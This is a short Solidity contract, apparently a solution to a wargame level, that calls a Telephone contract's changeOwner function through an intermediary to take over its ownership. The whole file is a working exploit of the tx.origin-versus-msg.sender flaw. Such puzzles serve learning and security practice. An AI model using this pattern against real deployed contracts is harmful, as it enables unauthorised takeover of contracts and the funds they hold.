// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import 'openzeppelin-contracts/contracts/utils/math/SafeMath.sol';
import './Telephone.sol';
contract TelephoneHack {
  using SafeMath for uint256;
  Telephone public telephone;

  constructor(address _telephoneAddress) {
    telephone = Telephone(_telephoneAddress);
  }

  function callTelephone(address _newOwnerAddress) public {
    telephone.changeOwner(_newOwnerAddress);
  }

}